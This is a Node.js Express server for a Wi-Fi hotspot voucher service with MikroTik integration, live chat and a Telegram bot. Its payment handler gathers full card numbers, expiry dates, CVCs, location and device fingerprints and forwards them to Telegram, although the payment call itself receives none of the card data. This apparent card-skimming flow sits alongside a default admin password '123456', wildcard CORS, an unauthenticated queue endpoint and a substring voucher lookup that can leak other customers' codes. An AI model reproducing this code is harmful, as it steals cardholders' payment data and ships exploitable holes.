const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
const multer = require("multer");
const fs = require('fs');
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendTelegramMessage, handleTelegramCallback, sendTelegramFailNotification } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");
const { processPaymentAndCreateCard } = require("./mikrotikService");
const { generateContributionHtmlPage } = require('./contributionMessages');
const { generateSuccessPageHtml } = require('./successPage'); // استدعاء صفحة النجاح المنفصلة
const { generateFailPageHtml } = require('./failPage');         // استدعاء صفحة الفشل المنفصلة

// استدعاء ملف الدعم المباشر (Chat Support)
const chatSupport = require('./chat_support');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://tales.net";

const { BRANCH_NAMES } = require('./branches');

global.generatedCardsMap = global.generatedCardsMap || new Map();

// تهيئة Socket.io للدعم المباشر
chatSupport.initSocket(io);

// إعداد Multer لاستقبال الصور والملفات المرفوعة في الشات
const upload = multer();

// مسار الملف المؤقت لحفظ وقت الصيانة على السيرفر
const maintenanceFile = path.join(__dirname, 'maintenance_status.json');

// استبدل السطر القديم app.use(cors()); بهذا الكود:
app.use(cors({
    origin: "*", // يسمح لأي موقع (مثل بلوجر) بالاتصال بالسيرفر
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true
}));

app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// دالة لجلب وقت الصيانة المحفوظ
function getMaintenanceEndTime() {
  try {
    if (fs.existsSync(maintenanceFile)) {
      const data = JSON.parse(fs.readFileSync(maintenanceFile, 'utf8'));
      return data.endTime || 0;
    }
  } catch (e) {
    console.error(e);
  }
  return 0;
}

// تنظيف دوري للذاكرة المؤقتة كل نصف ساعة
setInterval(() => {
  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  for (let [key, value] of global.generatedCardsMap.entries()) {
    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
      global.generatedCardsMap.delete(key);
    }
  }
}, 30 * 60 * 1000);

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ==========================================
// 🛡️ Middleware للتحكم التلقائي بالموقع والصيانة للجميع
// ==========================================
app.use((req, res, next) => {
  const currentTime = Date.now();
  const maintenanceEndTime = getMaintenanceEndTime();
  const isMaintenanceActive = maintenanceEndTime > currentTime;

  // 1. استثناءات لكي لا يحدث تعارض (ملفات التصميم، مسار صفحة الصيانة، ومسارات التحقق والـ API)
  if (
    req.path === "/dev-panel-lock" ||
    req.path === "/api/maintenance/status" ||
    req.path === "/api/maintenance/set" ||
    req.path === "/api/maintenance/verify" ||
    req.path.startsWith("/api/") ||
    req.path.includes(".") // ملفات CSS, JS, صور
  ) {
    return next();
  }

  // 2. إذا انتهى الوقت، نقوم بمسح الملف تلقائياً ليعمل الموقع بشكل طبيعي
  if (maintenanceEndTime > 0 && currentTime >= maintenanceEndTime) {
    try {
      if (fs.existsSync(maintenanceFile)) {
        fs.unlinkSync(maintenanceFile);
      }
    } catch (e) {}
    return next();
  }

  // 3. إذا كانت الصيانة مفعلة، قم بعرض صفحة الصيانة مباشرة لأي زائر
  if (isMaintenanceActive) {
    return res.sendFile(path.join(__dirname, "public", "maintenance.html"));
  }

  next();
});

app.use(express.static(path.join(__dirname, "public")));

// ==========================================
// 🛠️ نظام عرض صفحة الصيانة ومسارات التحكم الآمنة
// ==========================================
app.get("/dev-panel-lock", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "maintenance.html"));
});

// جلب حالة الوقت الحالية للعميل/السيرفر
app.get('/api/maintenance/status', (req, res) => {
  res.json({ endTime: getMaintenanceEndTime() });
});

// التحقق من الباسورد
app.post('/api/maintenance/verify', (req, res) => {
  const { password } = req.body;
  const adminPassword = process.env.MAINTENANCE_PASSWORD || "123456";

  if (password === adminPassword) {
    return res.json({ success: true, message: "تم التحقق بنجاح" });
  } else {
    return res.status(401).json({ success: false, message: "كلمة المرور غير صحيحة!" });
  }
});

// تعيين وقت صيانة جديد وحفظه على السيرفر
app.post('/api/maintenance/set', (req, res) => {
  const { password, minutes } = req.body;
  const adminPassword = process.env.MAINTENANCE_PASSWORD || "123456";

  if (password !== adminPassword) {
    return res.status(401).json({ success: false, message: "كلمة المرور غير صحيحة!" });
  }

  try {
    if (minutes === 0) {
      if (fs.existsSync(maintenanceFile)) {
        fs.unlinkSync(maintenanceFile);
      }
      return res.json({ success: true, message: "تم إلغاء الصيانة وفتح الموقع!" });
    }

    const endTime = Date.now() + (minutes * 60 * 1000);
    fs.writeFileSync(maintenanceFile, JSON.stringify({ endTime }));
    return res.json({ success: true, endTime, message: `تم ضبط الصيانة لمدة ${minutes} دقيقة!` });
  } catch (e) {
    return res.status(500).json({ success: false, message: "خطأ أثناء حفظ الوقت." });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

function getClientPublicIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.ip ||
    "غير متوفر"
  );
}

// ==========================================
// 💬 مسارات الدعم الفني المباشر (Chat Support API)
// ==========================================
app.post('/api/support/message', upload.single('image'), (req, res) => {
  chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
});

app.get('/api/support/messages/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const messages = chatSupport.getStoredMessages(clientId);
  res.json({ success: true, messages });
});

// ==========================================
// 🤖 مسار تليجرام الموحد (Webhook للرسائل وأزرار التفاعل)
// ==========================================
app.post('/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const data = update.callback_query.data || "";
      if (data.startsWith("reply_") || data.startsWith("close_")) {
        await chatSupport.handleTelegramReply(update);
        return res.sendStatus(200);
      }
    }

    if (update.message && update.message.reply_to_message) {
      await chatSupport.handleTelegramReply(update);
      return res.sendStatus(200);
    }

    if (update.callback_query) {
      await handleTelegramCallback(update.callback_query);
    }

    if (update.message || update.edited_message) {
      await chatSupport.handleTelegramReply(update);
    }

    res.sendStatus(200);
  } catch (e) {
    console.error("❌ Telegram Webhook Error:", e.message);
    res.sendStatus(500);
  }
});

// ==========================================
// 💳 مسارات المدفوعات وباقي الخدمة
// ==========================================
async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone, user_phone, phoneNumber, amount, payment_method, method,
      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
      geoData, branch, branch_key
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "waitPage";
    const rawBranch = branch || branch_key || "branch2";
    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.waitPage;

    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
    const payAmount = amount || "5";
    const transactionId = "TX_" + Date.now();

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      branch: selectedBranch,
      branchName: branchDisplayName,
      card_data: {
        number: (card_data && card_data.number) || number || "غير مدخل",
        name: (card_data && card_data.name) || name || "غير مدخل",
        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
      lat: lat || (geoData && geoData.lat) || "غير متوفر",
      lon: lon || (geoData && geoData.lon) || "غير متوفر",
      city: city || (geoData && geoData.city) || "غير متوفر",
      country: country || (geoData && geoData.country) || "غير متوفر",
      battery: battery || batteryInfo || "غير متوفر",
      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
      deviceRAM: deviceRAM || "غير متوفر",
      cpuCores: cpuCores || "غير متوفر",
      deviceType: deviceType || "غير متوفر",
      screenSize: screenSize || "غير متوفر",
      userTimeZone: userTimeZone || "غير متوفر",
      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
    };

    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, true);
    }

    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);

    if (result.type === "redirect") {
      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
        return res.json({ payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    } else {
      // توجيه العميل مباشرة إلى صفحة النجاح/الانتظار النشطة بدلاً من الملف المحذوف
      return res.redirect(`/success?id=${transactionId}&branch=${selectedBranch}`);
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
    if (req.headers["content-type"]?.includes("application/json")) {
      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
    }
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

app.get("/api/test-create-card", async (req, res) => {
  const secretKey = req.query.secret;
  
  if (!secretKey || secretKey !== process.env.TEST_SECRET_KEY) {
    return res.status(403).json({ 
      success: false, 
      message: "⚠️ غير مسموح لك بالوصول لهذا الرابط التجريبي. مفتاح الحماية غير صحيح أو مفقود." 
    });
  }

  try {
    const amount = req.query.amount || "5";
    const rawTarget = req.query.branch || req.query.branch_key || "branch2";
    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "branch2";
    const testTxId = "TEST_" + Date.now();

    const result = await processPaymentAndCreateCard(amount, targetBranch, testTxId);

    if (result.success && !result.isCustomAmount) {
      const cardPayload = {
        code: result.cardCode,
        packageName: result.packageName,
        amount: parseFloat(amount),
        phone: "01000000000",
        branchKey: result.branchKey,
        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
        createdAt: new Date()
      };

      global.generatedCardsMap.set(testTxId, cardPayload);

      return res.json({
        success: true,
        message: `✅ تم إضافة الكارت إلى الميكروتيك بنجاح وتوليده لفرع (${result.branchKey}) تحت الحماية!`,
        data: result,
        successPageLink: `/success?merchant_order_id=${testTxId}&branch=${result.branchKey}`
      });
    } else {
      return res.json({
        success: false,
        message: "⚠️ فشل توليد الكارت من الميكروتيك",
        details: result
      });
    }
  } catch (error) {
    console.error("❌ [TEST ERROR]:", error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/contribution-success", (req, res) => {
  const amount = req.query.amount || req.query.price || 150;
  const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
  const htmlContent = generateContributionHtmlPage(amount, transactionId);
  res.send(htmlContent);
});

app.get("/api/check-voucher/:txId", (req, res) => {
  const txId = String(req.params.txId || "").trim();
  
  if (!txId || txId === "null" || txId === "undefined") {
    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
  }

  if (global.generatedCardsMap) {
    if (global.generatedCardsMap.has(txId)) {
      return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
    }
    
    for (let [key, value] of global.generatedCardsMap.entries()) {
      if (String(key).includes(txId) || txId.includes(String(key))) {
        return res.json({ success: true, data: value });
      }
    }
  }

  return res.json({ 
    success: false, 
    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
  });
});

app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username } = req.body;
    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username);
      return res.json(result);
    }
    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

// استدعاء واجهة النجاح المنفصلة وتمرير البيانات والفروع بذكاء
app.get("/success", (req, res) => {
  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
  const queryBranch = req.query.branch || "";
  
  const pageHtml = generateSuccessPageHtml(transactionId, NETWORK_URL, queryBranch);
  return res.send(pageHtml);
});

// استعراض واجهة الفشل وإرسال إشعار لتليجرام
app.get("/fail", async (req, res) => {
  const errorMessage = req.query.data_message || req.query.error || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  
  const failData = {
    transactionId: req.query.id || req.query.order || req.query.transaction_id || `FAIL_${Date.now()}`,
    phone: req.query.phone || req.query.user_phone || "غير محدد",
    amount: req.query.amount || req.query.price || "غير محدد",
    branchName: req.query.branch || "حكايات نت رئيسي",
    publicIP: getClientPublicIP(req)
  };

  sendTelegramFailNotification(errorMessage, failData).catch(err => {
    console.error("Failed to send telegram fail notification:", err);
  });

  const pageHtml = generateFailPageHtml(errorMessage);
  return res.send(pageHtml);
});

app.use("/", webhookRouter);

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
